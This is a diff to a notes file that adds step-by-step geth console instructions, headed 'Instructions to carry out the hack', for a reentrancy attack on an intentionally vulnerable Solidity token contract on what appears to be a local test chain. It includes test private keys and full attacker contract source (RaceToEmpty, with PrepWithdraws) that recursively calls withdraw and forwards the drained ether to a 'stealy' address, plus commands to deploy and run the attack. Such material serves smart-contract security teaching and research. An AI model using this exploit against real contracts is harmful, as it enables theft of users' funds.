@@ -1,15 +1,3 @@
-# Notes
-
-
-Transfering from one account to another
-
-```
-eth.sendTransaction({ from: <from address>',
-                      to: <to address>,
-                      value: <number of wei>
-                    })
-```
-
 # Accounts
 
 coinbase address:     0xc96aaa54e2d44c299564da76e1cd3184a2386b8d
@@ -21,7 +9,11 @@ user private key:     0xcafebabecafebabecafebabecafebabecafebabecafebabecafebabe
 stealy address:       0x7057d488a44a3795993412a6c00deac60907f78c
 stealy private key:   0x57ea157ea157ea157ea157ea157ea157ea157ea157ea157ea157ea157ea157ea
 
-# Trace
+# Instructions to carry out the hack
+
+First have a good look at the contracts in `contracts/` directory.
+
+Then let's get started.
 
     var weiInEther = 1000000000000000000;
     var weiInSzabo = 1000000000000;
@@ -34,9 +26,14 @@ stealy private key:   0x57ea157ea157ea157ea157ea157ea157ea157ea157ea157ea157ea15
     personal.unlockAccount(creator,  "test", 10000); // for many hours
     personal.unlockAccount(stealy,   "test", 10000); // for many hours
 
+    var numTokens = 10; // the number of tokens we will be replicating in the attack
+    var numExtraWithdraws = 15; // the number of times we will replicate the tokens
+
+
+Wait until unlocks
 
     // Let Stealy have a little bit of ether to play around with
-    web3.eth.sendTransaction({from: creator, to: stealy, value: (10*weiInSzabo) });
+    web3.eth.sendTransaction({from: creator, to: stealy, value: ((numTokens+1)*weiInSzabo) });
 
     var contractNotifier = function(e, contract){
         if(!e) {
@@ -54,6 +51,7 @@ stealy private key:   0x57ea157ea157ea157ea157ea157ea157ea157ea157ea157ea157ea15
         }
     };
 
+
     var twiSource =  'contract TokenWithInvariants {   event Log(string msg ,address from, address to, uint value);   mapping(address => uint) public balanceOf;   uint public totalSupply;   /* 1 token = 1 szabo */   uint public conversion = 1 szabo;    modifier checkInvariants {     _     if (this.balance/conversion < totalSupply) throw;   }    /* intentionally vulnerable */   function deposit(uint amount) checkInvariants {     Log("deposit", msg.sender, 0x0, amount);     /* Throw if not enough value has been sent to "buy" token */     if (msg.value / conversion < amount) throw;     balanceOf[msg.sender] += amount;     totalSupply += amount;   }    function transfer(address to, uint value) checkInvariants {     Log("transfer", msg.sender, to, value);     if (balanceOf[msg.sender] >= value) {       balanceOf[to] += value;       balanceOf[msg.sender] -= value;     }   }    /* intentionally vulnerable */   function withdraw() checkInvariants {     uint balance = balanceOf[msg.sender];     Log("withdraw", 0x0, msg.sender, balance);     if (msg.sender.call.value(balance*conversion)()) {       totalSupply -= balance;       balanceOf[msg.sender] = 0;     }   } }';
 
 
@@ -64,17 +62,38 @@ stealy private key:   0x57ea157ea157ea157ea157ea157ea157ea157ea157ea157ea157ea15
 
 Wait for mining
 
-    var twiLogEvent = twi.Log({_from: creator});
-    twiLogEvent.watch(function(err, result) {
+    // Send a lot of ether to the TokenWithInvariants contract from creator
+    // We're not going to exploit a contract for chicken feed!
+    twi.deposit(1000, { from: creator,  gas: 1000000, gasPrice: 1, value: (1000*weiInSzabo)});
+
+    var twiLog = twi.Log().watch(function(err, result) {
       var a = result.args;
       if (err) { console.log(err); return; }
       console.log(a.msg, a.from, a.to, a.value);
     });
 
-    // Send some ether to the token contract from creator
-    twi.deposit(1000, { from: creator,  gas: 1000000, gasPrice: 1, value: (1000*weiInSzabo)});
-
 Getting ready for our attack run
+
+
+    // First compile the RaceToEmpty contract (the second part of our attack)
+
+    var r2eSource = '/* The proxy contract is required to declare an interface    that RaceToEmpty understands */ contract TWIProxy {   mapping(address => uint) public balanceOf;   uint public totalSupply;    function withdraw() {   }  }   /*  * This contract is used in conjunction with PrepWithdraws.  * The target of PrepWithdraws should be this contract.  * Once "start" has been called on PrepWithDraws call this  * contract in order to withdraw that many times  * a get the ether value equal to the total number of tokens  * withdrawn.  */ contract RaceToEmpty {   event Log(string msg, uint value);   /* It is important that performAttack is initially false so    * that we can give ether to this contract to deposit into    * TokenWithInvariants contract without invoking logic of    * the default function    */   bool performAttack = false;   uint8 depth = 0;   uint numExtraWithdraws;   /* Fill in with address of TokenWithInvariants contract */   TWIProxy twi;   address stealAddress;    /* Constructor */   function RaceToEmpty(address _twiAddress, address _stealAddress,                          uint _numExtraWithdraws) {     twi = TWIProxy(_twiAddress);     stealAddress = _stealAddress;     numExtraWithdraws   = _numExtraWithdraws;   }    /* Default function. Always run */   function() {     if (performAttack) {       depth = depth + 1;       if (depth <= numExtraWithdraws) {  /* attack again */         Log("Extra withdraw number ", depth);         twi.withdraw();       } else {         Log("Finished", 0);         /* Send all value to stealAddress */         stealAddress.call.value(this.balance)();         performAttack = false; /* turn off attack again*/       }     }   }    function reset() {     performAttack = false;   }    function start() {     depth = 0;     performAttack = true;     Log("First withdraw. Tokens = ", twi.balanceOf(this));     twi.withdraw();   }  }';
+
+    var r2eCompiled = web3.eth.compile.solidity(r2eSource);
+    var r2eContract = web3.eth.contract(r2eCompiled.RaceToEmpty.info.abiDefinition);
+
+    var raceToEmpty = r2eContract.new(twi.address, stealy, numExtraWithdraws, { from: stealy, data: r2eCompiled.RaceToEmpty.code, gas: 1000000, gasPrice: 1}, contractNotifier);
+
+Wait for the raceToEmpty contract to be mined
+
+    // Set up logging for raceToEmpty
+
+    var r2eLog = raceToEmpty.Log().watch(function(err, result) {
+      var a = result.args;
+      if (err) { console.log(err); return; }
+      console.log(a.msg, a.value);
+    });
+
 
     // Now compile the PrepWithdraws contract
 
@@ -84,10 +103,8 @@ Getting ready for our attack run
     var prepWithdrawsCompiled = web3.eth.compile.solidity(prepWithdrawsSource);
     var prepWithdrawsContract = web3.eth.contract(prepWithdrawsCompiled.PrepWithdraws.info.abiDefinition);
 
-    var numTokens = 2;
-    var numWithdraws = 10;
 
-    var prepWithdraws = prepWithdrawsContract.new(twi.address, stealy, numTokens, numWithdraws, { from: creator, data: prepWithdrawsCompiled.PrepWithdraws.code, gas: 1000000, gasPrice: 1}, contractNotifier)
+    var prepWithdraws = prepWithdrawsContract.new(twi.address, raceToEmpty.address, numTokens, numExtraWithdraws, { from: stealy, data: prepWithdrawsCompiled.PrepWithdraws.code, gas: 1000000, gasPrice: 1}, contractNotifier);
 
 Wait for mining
 
@@ -98,22 +115,40 @@ Wait for mining
     });
 
 
-    // Give an initial amount to the attack contract
-    web3.eth.sendTransaction({from: stealy, to: prepWithdraws.address, value: numTokens*weiInSzabo, gas: 1000000, gasPrice: 1 })
+    // Give an initial amount to the attack contract. This value must be equal to
+    // numTokens tokens worth of ether. The attack will not work without it!
+    web3.eth.sendTransaction({from: stealy, to: prepWithdraws.address, value: numTokens*weiInSzabo, gas: 1000000, gasPrice: 1 });
 
+    var checkState = function() {
+      console.log("TWI total supply:", twi.totalSupply(), "balanceOf(prepWithdraws):", twi.balanceOf(prepWithdraws.address), "balanceOf(raceToEmpty):", twi.balanceOf(raceToEmpty.address));
+      console.log("TWI value:", szaboOf(twi.address), "prepWithdraws value:", szaboOf(prepWithdraws.address), "stealy value:", szaboOf(stealy));
+    };
+
+Wait just a few seconds:
 
     // Check previous state
-    console.log("TWI total supply:", twi.totalSupply(), "balanceOf(prepWithdraws):", twi.balanceOf(prepWithdraws.address), "balanceOf(stealy):", twi.balanceOf(stealy));
-    console.log("TWI value:", szaboOf(twi.address), "prepWithdraws value:", szaboOf(prepWithdraws.address), "stealy value:", szaboOf(stealy));
+    checkState();
 
-    // Now we are ready for the attack
+Check that `prepWithdraws value` is equal to `numTokens`
+OMG, ready for the attack! Let's do it!
 
-    prepWithdraws.start({ from: stealy, gas: 10000000, gasPrice: 1})
+    prepWithdraws.start({ from: stealy, gas: 10000000, gasPrice: 1});
 
-Wait until finished
+Wait until finished. You will see a bunch of log messages come up.
 
-    console.log("TWI total supply:", twi.totalSupply(), "balanceOf(prepWithdraws):", twi.balanceOf(prepWithdraws.address), "balanceOf(stealy):", twi.balanceOf(stealy));
-    console.log("TWI value:", szaboOf(twi.address), "prepWithdraws value:", szaboOf(prepWithdraws.address), "stealy value:", szaboOf(stealy));
+    checkState();
+
+Interesting, huh? The TWI total supply should be equal to `1000 - (numExtraWithdraws - 1 )* numTokens`.
+The TWI value should be `1000 + numTokens`. Now run the second part of the attack:
+
+    raceToEmpty.start({ from: stealy, gas: 10000000, gasPrice: 1});
+
+Wait until finished. Now check final balances
+
+    checkState();
+
+If all was successful then "stealy value" should be greater than before by
+`(numTokens + 1) * numExtraWithdraws`
 
 # Oddities
 
